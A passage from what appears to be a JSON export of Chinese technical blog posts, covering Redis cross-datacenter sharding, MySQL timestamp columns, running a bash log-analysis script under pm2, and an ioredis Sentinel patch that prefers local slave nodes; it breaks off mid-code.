API）的形式，完成整个业务逻辑处理。\n也可以将客户端的请求转发到另一机房服务，并将响应发回客户端，相当于是内置了服务代理（Proxy）功能。\n</p>\n</li>\n</ul>\n\n\n<p>\n由此可见，不跨机房访问 Redis 这份美好是有代价的，客户端和服务器端的业务逻辑会更复杂，客户端或服务器端需要针对跨机房的数据进行特殊处理。\n</p>\n\n<p>\n通过选择正确的数据分片（Sharding）方式，确保主要或高频次的客户端请求能够在同一数据中心内完成。次要或低频次的客户端请求允许跨数据中心，通过在本地数据中心部署其它数据中心的复本（Slave）的方式，将跨数据中心\"读\"转化为本地\"读\"，少量的跨数据中心\"写\"不成问题。\n</p>\n\n<p>\n如下图所示\n<img src=\"../static/redis-embrace_cross_datacenter_flow.png\" alt=\"redis-embrace_cross_datacenter_flow.png\" />\nRedis Group 1 存储主要或高频次的数据，Redis Group 2 存储次要或低频次的数据。\n</p>\n\n<p>\n客户端通过 DataCenter 1 访问本地的 Redis Group 1 属于合理的访问。\n业务逻辑可能需要访问 Redis Group 2，读操作可以发往本地的 Redis Group 2 Slave，写操作要跨机房访问 DataCenter 2 中的 Redis Group 2 Master（应该尽量减少）。\n</p>\n\n<p>\n客户端通过 DataCenter 2 访问本地的 Redis Group 2 属于合理的访问。\n业务逻辑主要需要访问 Redis Group 1，读操作可以发往本地的 Redis Group 1 Slave，写操作需要跨机房访问 DataCenter 1 中的 Redis Group 1 Master，\n这是不合理的，因此在发给客户端的响应中指示客户端下次将请求发往 Redis Group 1 Master 所在的 DataCenter 1。</p>\n</div>\n</div>\n"
},
{
  "title": "mysql 实现 ctime、mtime、atime 语义",
  "timestamp": "2016-08-26 19:18:00",
  "tags": [
    "mysql"
  ],
  "body": "<p>\n事物有常见的三个时间属性\n</p>\n\n<ul class=\"org-ul\">\n<li>创建时间（ctime）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>修改时间（mtime）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>访问时间（atime）\n</li>\n</ul>\n\n\n<p>\n下面考虑使用 mysql 实现。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">不要使用 REPLACE</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n<a href=\"http://dev.mysql.com/doc/refman/5.7/en/replace.html\">MySQL :: MySQL 5.7 Reference Manual :: 14.2.8 REPLACE Syntax</a>\n</p>\n<blockquote>\n<p>\nREPLACE 像 INSERT 一样运作，除了：表中的旧记录与新记录的主键（PRIMARY KEY）或唯一索引（UNIQUE index）一样时，删掉旧记录再插入新记录。 \n</p>\n\n<p>\nREPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. \n</p>\n</blockquote>\n\n<p>\n这就意味着默认值定义为 <code>DEFAULT CURRENT_TIMESTAMP</code> 的字段，在缺失的情况下会重置为当前时间（CURRENT_TIMESTAMP）。\n</p>\n</div>\n\n<div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">自行实现创建或修改语义</h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<p>\n更新（UPDATE）记录，如果 <code>affectedRows</code> 为 0，再尝试插入（INSERT）记录。\n</p>\n\n<p>\n由于更新（UPDATE）和插入（INSERT）是两个操作，并发访问的情况下，插入（INSERT）时记录可以已要存在，因此还需要忽略主键冲突错误。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">不要使用 ON UPDATE CURRENT_TIMESTAMP</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n这里的 <code>UPDATE</code> 是指更新语句（UPDATE、INSERT、REPLACE）是否改动了记录内容，\n新值与旧值不一样表示记录内容变化，会更新字段值为当前时间，否则，不会更新字段值为当前时间。\n</p>\n\n<p>\n可在更新语句中设置字段值为 <code>CURRENT_TIMESTAMP</code> ，强制字段值总是更新为当前时间。\n</p>\n\n<p>\n另外，更新访问时间（atime）时，会导致使用了 <code>ON UPDATE CURRENT_TIMESTAMP</code> 的字段更新为当前时间。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">创建时间（ctime）</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n</div><div id=\"outline-container-sec-3-1\" class=\"outline-3\">\n<h3 id=\"sec-3-1\">字段定义</h3>\n<div class=\"outline-text-3\" id=\"text-3-1\">\n<pre class=\"example\">\nctime TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP\n</pre>\n\n<p>\n指定默认值为当前时间，在记录创建时自动设置。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">字段值更新</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\nINSERT（或 UPDATE） 语句创建（或更新）记录，不指定 <code>ctime</code> 字段。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">更新时间（mtime）</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n</div><div id=\"outline-container-sec-5-1\" class=\"outline-3\">\n<h3 id=\"sec-5-1\">字段定义</h3>\n<div class=\"outline-text-3\" id=\"text-5-1\">\n<pre class=\"example\">\nmtime TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP\n</pre>\n\n<p>\n指定默认值为当前时间，在记录创建时自动设置。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">字段值更新</h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<p>\nINSERT 语句创建记录，不指定 <code>mtime</code> 字段，或指定字段值为 CURRENT_TIMESTAMP。\n</p>\n\n<p>\nUPDATE 语句更新记录，指定 <code>mtime</code> 字段值为 CURRENT_TIMESTAMP。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-7\" class=\"outline-2\">\n<h2 id=\"sec-7\">访问时间（atime）</h2>\n<div class=\"outline-text-2\" id=\"text-7\">\n</div><div id=\"outline-container-sec-7-1\" class=\"outline-3\">\n<h3 id=\"sec-7-1\">字段定义</h3>\n<div class=\"outline-text-3\" id=\"text-7-1\">\n<pre class=\"example\">\natime TIMESTAMP NOT NULL DEFAULT \"0000-00-00 00:00:00\"\n</pre>\n\n<p>\n指定默认值为空时间值（表示未访问），在记录创建时自动设置。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-8\" class=\"outline-2\">\n<h2 id=\"sec-8\">字段值更新</h2>\n<div class=\"outline-text-2\" id=\"text-8\">\n<p>\nUPDATE 语句更新记录，指定 <code>atime</code> 字段值为 CURRENT_TIMESTAMP。</p>\n</div>\n</div>\n"
},
{
  "title": "使用 pm2 启动 bash 后台脚本",
  "timestamp": "2016-09-02 10:28:00",
  "tags": [
    "linux",
    "node",
    "pm2"
  ],
  "body": "<p>\n我们常常会使用 bash 写一些后台运行的守护进程，然后使用 crontab 实现开机启动并监控，\n也可以改为使用 pm2 来运行，功能更强大，更简单规范。\n</p>\n\n<p>\n使用 pm2 来管理后台进程仍然可以获得其大部分功能，如：\n</p>\n\n<ul class=\"org-ul\">\n<li>日志管理\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>监控\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>进程管理\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>开机启动\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>崩溃重启\n</li>\n</ul>\n\n\n<p>\n如下定义 process.json\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-json\">{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> apps : [{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   name      : <span style=\"color: #66cccc;\">\"run-log-analyze\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   script    : <span style=\"color: #66cccc;\">\"./tools/run-log-analyze.sh\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   env: {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   },\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   merge_logs: <span style=\"color: #6699cc;\">true</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   error_file: <span style=\"color: #66cccc;\">\"tools/run-log-analyze.log\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   out_file: <span style=\"color: #66cccc;\">\"tools/run-log-analyze.log\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exec_mode: <span style=\"color: #66cccc;\">\"fork\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> }]\n}\n</pre>\n</div>\n\n<p>\nrun-log-analyze.sh 用于实时分析应用的日志\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">tail -f ./run.log | bunyan --strict -c <span style=\"color: #66cccc;\">'this.msg == \"file uploaded\"'</span> -0 | json -<span style=\"text-decoration: underline;\">ga file | ./tools/file-scan -o ./tools/file-scan-successed.log -e ./tools/file-scan-failed.log</span>\n</pre>\n</div>\n\n<p>\n上面的脚本不断读取 run.log，将上传的文件路径名提取出来，然后传给文件扫描程序（./tools/file-scan），扫描成功日志文件为 ./tools/file-scan-successed.log，扫描失败日志文件为 ./tools/file-scan-failed.log。\n</p>\n\n<p>\n现在在尝试启动进程\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 start process.json\n</pre>\n</div>\n\n<p>\n查看进程运行状态\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 list\n</pre>\n</div>\n\n<p>\n然后尝试重启\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pm2 restart process.json\n</pre>\n</div>\n\n<p>\n发现后台有两个 <code>file-scan</code> 及 <code>tail -f ./run.log</code> 进程，restart 没有将子进程杀死，不过父进程 /bin/bash 进程倒是杀死了。\n</p>\n\n<p>\n估计是 bash 使用 pm2 fork-mode 运行后，其终端被 detach 了，相当于是后台 daemon 进程，bash 进程死掉后， <code>tail -f ./run.log</code> 进程收不到 SIGHUP 信号也就没有跟着退出。\n</p>\n\n<p>\n可以利用 tail 命令的参数 <code>-pid</code> ，指定 bash 结束时中断 <code>tail -f</code> 命令\n</p>\n\n<p>\n<code>man tail</code>\n</p>\n<blockquote>\n<p>\n&#x2013;pid=PID\n       with -f, terminate after process ID, PID dies  \n</p>\n</blockquote>\n\n<p>\n将 run-log-analyze.sh 改写如下\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">tail -f --pid=$<span style=\"color: #ffcc66;\">$</span> ./run.log | bunyan --strict -c <span style=\"color: #66cccc;\">'this.msg == \"file uploaded\"'</span> -0<span style=\"text-decoration: underline;\"> | json -ga file | ./tools/file-scan -o ./tools/file-scan-successed.log -e ./tools/file-scan-failed.log</span>\n</pre>\n</div>\n"
},
{
  "title": "ioredis Sentinel 实现就近访问",
  "timestamp": "2016-09-10 18:12:00",
  "tags": [
    "redis",
    "node"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"https://github.com/luin/ioredis/\">ioredis</a> 支持按角色（Role）进行连接</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n引用自 <a href=\"https://github.com/luin/ioredis/\">ioredis</a>\n</p>\n<blockquote>\n<p>\nioredis 保证即使故障转移（failover）后你连接的结点依然是 master 。当故障转移发生，ioredis 会向 sentinels 询问新的 master 结点并连接，而不是尝试重连失效的结点（恢复可用后它会降级为 slave）。故障转移期间发送的所有命令将放入队列，当新连接建立后再执行，不会丢失命令。\n</p>\n\n<p>\n可以指定 role 选项为 slave 以连接 slave 结点，ioredis 将尝试连接指定 master 的一个随机 slave 结点，并且保证连接的结点总是 slave 角色。当连接的结点因为故障转移而提升为 master，ioredis 将从该结点断开连接并询问 sentinels 获取另一个 slave 结点进行连接。\n</p>\n\n<p>\nioredis guarantees that the node you connected to is always a master even after a failover. When a failover happens, instead of trying to reconnect to the failed node (which will be demoted to slave when it's available again), ioredis will ask sentinels for the new master node and connect to it. All commands sent during the failover are queued and will be executed when the new connection is established so that none of the commands will be lost.\n</p>\n\n<p>\nIt's possible to connect to a slave instead of a master by specifying the option role with the value of slave, and ioredis will try to connect to a random slave of the specified master, with the guarantee that the connected node is always a slave. If the current node is promoted to master due to a failover, ioredis will disconnect from it and ask the sentinels for another slave node to connect to.\n</p>\n</blockquote>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https://github.com/luin/ioredis/\">ioredis</a> 会随机选择一个 Slave</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n引用自 ioredis/lib/connectors/sentinel_connector.js\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">SentinelConnector.<span style=\"color: #6699cc;\">prototype</span>.resolveSlave = <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">client</span>, <span style=\"color: #ffcc66;\">callback</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> client.sentinel(<span style=\"color: #66cccc;\">'slaves'</span>, <span style=\"color: #6699cc;\">this</span>.options.name, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>, <span style=\"color: #ffcc66;\">result</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.disconnect();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #99cc99;\">return</span> callback(err);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">selectedSlave</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (Array.isArray(result)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">availableSlaves</span> = [];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #99cc99;\">for</span> (<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">i</span> = 0; i &lt; result.length; ++i) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">slave</span> = utils.packObject(result[i]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (slave.flags &amp;&amp; !slave.flags.match(<span style=\"color: #66cccc;\">/(disconnected|s_down|o_down)/</span>)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> availableSlaves.push(slave);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span> selectedSlave = _.sample(availableSlaves);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   callback(<span style=\"color: #6699cc;\">null</span>, selectedSlave ? { host: selectedSlave.ip, port: selectedSlave<span style=\"text-decoration: underline;\">.port } : </span><span style=\"color: #6699cc; text-decoration: underline;\">null</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> });\n};\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">优先选择本地 Slave</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n相关讨论\n</p>\n\n<p>\n<a href=\"https://github.com/luin/ioredis/issues/38\">rfc - a preferred slave list in a sentinel setup · Issue #38 · luin/ioredis</a>\n</p>\n\n<p>\n短期内应该不会实现。\n</p>\n\n\n<p>\n尝试自已实现优先选择本地 Slave 算法：按 IP 地址进行推断，前三段一样则认为是本地。\n</p>\n\n<p>\n假设本机 IP 为 11.22.33.1，则 Slave 11.22.33.123 由于前三段（11.22.33）与本机相同被认定为是本地 Slave，而 Slave 11.22.99.1 由于前三段（11.22.99）与本机不同被认定为是异地 Slave。\n</p>\n\n<p>\n实现如下\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">Redis</span>     = require(<span style=\"color: #66cccc;\">'ioredis'</span>),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   utils     = require(<span style=\"color: #66cccc;\">'ioredis/lib/utils'</span>),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   _         = require(<span style=\"color: #66cccc;\">'lodash'</span>),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   net       = require(<span style=\"color: #66cccc;\">'net'</span>),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert    = require(<span style=\"color: #66cccc;\">'assert'</span>);\n\n\n<span style=\"color: #999999; font-style: italic;\">/**</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* A SentinelConnector.prototype.resolveSlave replacement, prefer local slave.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@param</span><span style=\"color: #999999; font-style: italic;\"> </span><span style=\"color: #ffcc66; font-style: italic;\">client</span><span style=\"color: #999999; font-style: italic;\"> redis client.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@param</span><span style=\"color: #999999; font-style: italic;\"> </span><span style=\"color: #ffcc66; font-style: italic;\">callback</span><span style=\"color: #999999; font-style: italic;\"> function (err, slave) called when done.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*                 slave with a extra boolean field \"local_node\" to indicate sla</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">ve is in local network.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">resolveSlavePreferLocal</span> (<span style=\"color: #ffcc66;\">client</span>, <span style=\"color: #ffcc66;\">callback</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">self</span> = <span style=\"color: #6699cc;\">this</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.sentinel(<span style=\"color: #66cccc;\">'slaves'</span>, <span style=\"color: #6699cc;\">this</span>.options.name, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>, <span style=\"color: #ffcc66;\">result</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.disconnect();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(err);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">localIP</span> = client.stream.localAddress;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.disconnect();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">localIPSegments</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Array</span>(4);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (net.isIPv4(localIP)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   localIPSegments = localIP.split(<span style=\"color: #66cccc;\">'.'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">selectedSlave</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">local_node</span> = <span style=\"color: #6699cc;\">false</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (Array.isArray(result)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">localSlaves</span> = [];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">remoteSlaves</span> = [];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span> (<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">i</span> = 0; i &lt; result.length; ++i) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">slave</span> = utils.packObject(result[i]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (slave.flags &amp;&amp; !slave.flags.match(<span style=\"color: #66cccc;\">/(disconnected|s_down|o_do</span><span style=\"color: #66cccc; text-decoration: underline;\">wn)/</span><span style=\"text-decoration: underline;\">)) {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (net.isIPv4(slave.ip)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">slaveIpSegments</span> = slave.ip.split(<span style=\"color: #66cccc;\">'.'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (localIPSegments[0] === slaveIpSegments[0] &amp;&amp;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   localIPSegments[1] === slaveIpSegments[1] &amp;&amp;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   localIPSegments[2] === slaveIpSegments[2]) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   localSlaves.push(slave);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">continue</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   remoteSlaves.push(slave);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   